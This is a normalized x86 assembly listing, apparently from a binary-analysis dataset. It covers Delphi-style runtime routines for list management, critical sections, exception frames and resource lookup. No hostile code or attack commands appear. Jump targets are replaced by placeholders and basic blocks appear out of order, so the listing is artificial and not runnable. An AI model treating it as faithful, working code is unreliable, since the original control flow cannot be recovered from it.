mov [ edi + 0x20 ] eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebp ebp
mov eax [ edi + 0x4 ]
mov edx ebp
call sub_41a5d0
mov ebx eax
mov edx [ esp ]
mov eax ebx
call sub_4194a8
mov [ ebx + 0x10 ] al
inc ebp
dec esi
jne r-xdata
sub_4196bc
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403224
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov [ edi + 0x4 ] eax
lea eax [ edi + 0x8 ]
push eax
call InitializeCriticalSection
mov ecx [ r-xdata ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41938c
mov esi eax
mov eax [ edi + 0x4 ]
mov edx esi
call sub_41a474
mov [ esi + 0x10 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_419730
push ebx
push esi
push edi
push ebp
call sub_4035e0
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
mov eax [ esi + 0x4 ]
mov ebp [ eax + 0x8 ]
dec ebp
test ebp ebp
jl r-xdata
mov eax [ esi + 0x4 ]
call sub_403254
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403244
test bl bl
jle r-xdata
inc ebp
xor edi edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
mov eax [ esi + 0x4 ]
mov edx edi
call sub_41a5d0
call sub_403254
inc edi
dec ebp
jne r-xdata
sub_41978c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor esi esi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov eax [ ebp + 0x4 ]
mov edx edi
call sub_41a5d0
mov edx [ esp ]
push edx
mov ecx esi
mov edx eax
mov eax [ r-xdata ]
call sub_41931c
mov esi eax
inc edi
dec ebx
jne r-xdata
sub_4197d0
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor edi edi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
test edi edi
jne r-xdata
mov edx [ esp ]
call sub_419448
mov edi eax
inc esi
dec ebx
jne r-xdata
mov eax [ ebp + 0x4 ]
mov edx esi
call sub_41a5d0
cmp [ eax + 0x10 ] 0x0
je r-xdata
sub_419814
push ebp
mov ebp esp
add esp 0xfffffef4
xor eax eax
mov [ ebp - 0x10c ] eax
xor eax eax
push ebp
push sub_419897
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4031a4
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10c ]
mov eax [ rw-data ]
call sub_405ecc
mov ecx [ ebp - 0x10c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc64
call sub_4039e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41989e
lea eax [ ebp - 0x10c ]
call sub_403fa4
retn
sub_4198a4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_41978c
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_4192b0
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_419814
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
inc [ ebp - 0x14 ]
dec [ ebp - 0x18 ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_41a5d0
mov edi eax
cmp edi [ ebp - 0x10 ]
je r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_41a5d0
mov esi eax
mov edx [ ebp - 0xc ]
mov eax esi
call sub_403480
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_41978c
cmp eax [ ebp - 0x10 ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_41a4c0
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_41a474
sub_419990
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_41a5d0
mov edx ebp
call sub_419594
test al al
jne r-xdata
sub_4199d4
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ecx ebp
mov dl 0x1
mov eax [ r-xdata ]
call sub_41938c
mov edx eax
mov eax [ edi + 0x4 ]
call sub_41a474
inc ebx
xor esi esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_41a5d0
mov eax [ eax + 0xc ]
mov edx ebp
call sub_41a62c
test eax eax
jge r-xdata
sub_419a30
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_41a5d0
mov esi eax
mov edx ebp
mov eax esi
call sub_4195cc
mov eax [ esi + 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax esi
call sub_403254
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_41a4c0
sub_419a80
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_403224
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
mov eax [ rw-data ]
call sub_41996c
xor eax eax
push ebp
push sub_419b7f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_403578
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc esi
xor edi edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419b86
mov eax [ rw-data ]
call sub_419a24
retn
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_41a474
inc esi
xor edi edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_41a5d0
mov ebx eax
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_4194a8
test al al
je r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_41a474
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_41a5d0
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
je r-xdata
sub_419b86
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_419bac
push ebx
push esi
call sub_4035e0
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403254
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403244
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
sub_419bdc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
call sub_41996c
xor edx edx
push ebp
push sub_419c53
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_419a24
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
call sub_403a8c
jmp r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_41a5d0
mov edx [ ebp - 0x4 ]
call sub_419448
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_419c70
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_419cd0
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405ecc
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc64
call sub_4039e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419cd7
lea eax [ ebp - 0xc ]
call sub_403fa4
retn
sub_419cdc
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_41996c
xor eax eax
push ebp
push sub_419d22
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_4197d0
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419d29
mov eax [ rw-data ]
call sub_419a24
retn
sub_419d30
push ebx
push esi
mov esi eax
mov eax esi
call sub_419cdc
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax esi
call sub_419c70
sub_419d50
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_41996c
xor eax eax
push ebp
push sub_419db5
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_419990
test al al
je r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_419978
cmp ebx [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419dbc
mov eax [ rw-data ]
call sub_419a24
retn
mov eax ebx
call sub_4031e0
mov ebx eax
sub_419dc0
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_41996c
xor eax eax
push ebp
push sub_419e02
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_419a30
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419e09
mov eax [ rw-data ]
call sub_419a24
retn
sub_419e0c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_41996c
xor eax eax
push ebp
push sub_419e4e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_4199d4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419e55
mov eax [ rw-data ]
call sub_419a24
retn
sub_419e58
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
call sub_41996c
xor eax eax
push ebp
push sub_419e9f
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ rw-data ]
call sub_4198a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419ea6
mov eax [ rw-data ]
call sub_419a24
retn
sub_419eac
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_41996c
xor eax eax
push ebp
push sub_419efa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax [ rw-data ]
call sub_419670
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419f01
mov eax [ rw-data ]
call sub_419a24
retn
sub_419f60
push ebp
mov ebp esp
test dl dl
je r-xdata
mov [ eax + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax + 0xc ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_403578
pop ebp
retn 0x8
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_419f98
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_419f60
mov edx eax
mov eax [ rw-data ]
call sub_41a8f0
pop edi
pop esi
pop ebx
retn
sub_419fc4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_41a978
mov esi eax
xor edx edx
push ebp
push sub_41a02e
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41a9dc
retn
mov edx ebx
mov eax esi
call sub_41a5d0
cmp edi [ eax + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_403a8c
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41a040
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
xor eax eax
inc esi
lea ebx [ ecx + 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov al 0x1
mov edx [ ebp - 0x4 ]
mov ecx [ ebx - 0x4 ]
mov [ edx ] ecx
jmp r-xdata
mov edx edi
mov eax [ ebx ]
call sub_4081d4
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_41a080
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov [ ebp - 0x5 ] 0x0
inc esi
mov ebx [ ebp - 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov [ ebp - 0x5 ] 0x1
mov eax edi
mov edx [ ebx + 0x4 ]
call sub_403ff8
jmp r-xdata
cmp eax [ ebx ]
jne r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_41a0c4
push ebx
push esi
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov esi ebx
mov edx esi
mov eax [ rw-data ]
call sub_41a62c
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov [ rw-data ] eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ rw-data ]
call sub_41a474
sub_41a11c
push ebx
push esi
push edi
mov esi eax
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ebx [ edx + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_41a5d0
mov edi eax
mov eax esi
call edi
test eax eax
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_41a15c
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_41a11c
test eax eax
sete al
pop ebx
retn
mov eax ebx
call [ rw-data ]
pop ebx
retn
sub_41a180
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
test ebx ebx
jne r-xdata
push 0xa
mov eax edi
call sub_404464
push eax
push ebx
call FindResourceA
test eax eax
setne al
test al al
je r-xdata
mov ebx [ rw-data ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push edi
push 0xa
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41caf4
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41a1f4
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_41c5f4
mov [ esi ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403254
retn
sub_41a204
push ebx
call sub_406138
mov ebx [ eax + 0xc ]
test ebx ebx
jne r-xdata
call sub_406138
mov edx [ eax + 0x8 ]
mov eax ebx
call sub_41a474
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov ebx eax
call sub_406138
mov [ eax + 0x8 ] ebx
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov ebx eax
call sub_406138
mov [ eax + 0xc ] ebx
sub_41a25c
push ebx
push esi
push edi
call sub_406138
mov edi [ eax + 0x8 ]
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_41a5d0
mov edx [ eax ]
call [ edx + 0xc ]
inc esi
dec ebx
jne r-xdata
sub_41a28c
push ebx
push esi
call sub_406138
mov eax [ eax + 0x8 ]
call sub_403254
call sub_406138
mov ebx [ eax + 0xc ]
mov eax ebx
call sub_41a6b8
mov esi eax
call sub_406138
mov [ eax + 0x8 ] esi
mov edx [ ebx + 0x8 ]
dec edx
mov eax ebx
call sub_41a4c0
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
call sub_406138
xor edx edx
mov [ eax + 0xc ] edx
mov eax ebx
call sub_403254
sub_41a2e8
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
xor edx edx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_41a37e
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
cmp esi [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a385
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
mov eax [ ebp + 0x8 ]
cmp esi [ eax - 0x8 ]
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_4031e0
call sub_41a2e8
pop ecx
mov ebx eax
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_4031a4
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_404208
mov eax [ ebp - 0x4 ]
push eax
mov eax esi
call sub_4053b4
call sub_405404
mov edx eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x4 ]
pop eax
call sub_41a180
or bl al
sub_41a390
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_41a43e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
sete [ ebp - 0xa ]
cmp [ ebp - 0xa ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_41a41f
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x4 ]
call sub_40319c
call sub_41a2e8
pop ecx
mov [ ebp - 0x9 ] al
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_41a204
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a426
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_41a25c
retn
call sub_41a28c
sub_41a454
push ebx
push esi
call sub_4035e0
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
sub_41a474
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x8 ]
cmp esi [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax esi
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_41a4c0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_41a55c
cmp esi [ ebx + 0x8 ]
jl r-xdata
test edi edi
je r-xdata
sub eax esi
mov ecx eax
shl ecx 0x2
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 + 0x4 ]
call sub_4029c0
mov edx esi
mov eax ebx
call sub_41a5d0
mov edi eax
dec [ ebx + 0x8 ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cl 0x2
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_41a524
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_41a520
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc64
jmp sub_4039e0
sub_41a55c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi ecx
mov ebx edx
xor eax eax
push ebp
push sub_41a5a4
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_405ecc
mov edx [ ebp - 0x4 ]
mov ecx esi
mov eax [ r-xdata ]
call sub_41a524
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a5ab
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
sub_41a5d0
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_41a55c
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + esi * 4 ]
pop esi
pop ebx
retn
sub_41a5f8
mov edx [ eax + 0xc ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov ecx edx
test ecx ecx
jns r-xdata
mov ecx 0x4
mov ecx 0x10
jmp r-xdata
sar ecx 0x2
jmp r-xdata
add ecx 0x3
add ecx edx
mov edx ecx
call sub_41a734
retn
sub_41a62c
push ebx
xor ecx ecx
jmp r-xdata
cmp ecx [ eax + 0x8 ]
jge r-xdata
cmp ecx [ eax + 0x8 ]
jne r-xdata
mov ebx [ eax + 0x4 ]
cmp edx [ ebx + ecx * 4 ]
jne r-xdata
mov eax ecx
pop ebx
retn
or ecx 0xffffffff
inc ecx
sub_41a64c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_41a55c
cmp esi [ ebx + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
sub eax esi
mov ecx eax
shl ecx 0x2
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 + 0x4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 ]
call sub_4029c0
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_41a6c4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_41a55c
cmp esi [ ebx + 0x8 ]
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov [ edx + esi * 4 ] edi
test eax eax
je r-xdata
mov edx [ ebx + 0x4 ]
mov eax [ edx + esi * 4 ]
cmp edi eax
je r-xdata
test edi edi
je r-xdata
mov cl 0x2
mov edx eax
mov eax ebx
mov esi [ eax ]
call [ esi + 0x4 ]
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_41a714
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_41a62c
mov esi eax
test esi esi
jl r-xdata
mov eax esi
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_41a4c0
sub_41a734
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_41a55c
cmp esi 0x7ffffff
jle r-xdata
pop esi
pop ebx
retn
mov edx esi
shl edx 0x2
lea eax [ ebx + 0x4 ]
call sub_402804
mov [ ebx + 0xc ] esi
cmp esi [ ebx + 0xc ]
je r-xdata
sub_41a770
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_41a55c
cmp esi 0x7ffffff
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_41a734
cmp esi [ ebx + 0xc ]
jle r-xdata
mov ebp eax
dec ebp
mov edi esi
sub edi ebp
jg r-xdata
mov edx [ ebx + 0x4 ]
lea edx [ edx + eax * 4 ]
mov ecx esi
sub ecx eax
mov eax ecx
shl eax 0x2
xor ecx ecx
xchg edx eax
call sub_402c68
jmp r-xdata
mov [ ebx + 0x8 ] esi
pop ebp
pop edi
pop esi
pop ebx
retn
dec edi
mov edx ebp
mov eax ebx
call sub_41a4c0
dec ebp
inc edi
jne r-xdata
sub_41a7e0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor esi esi
mov edx edi
mov eax ebx
call sub_41a62c
test eax eax
jl r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
mov esi edi
mov edx [ ebx + 0x4 ]
xor ecx ecx
mov [ edx + eax * 4 ] ecx
mov edx eax
mov eax ebx
call sub_41a4c0
mov cl 0x1
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_41a820
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403224
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov [ esi + 0x4 ] eax
mov [ esi + 0x20 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax esi
pop esi
pop ebx
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_41a874
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_4035e0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
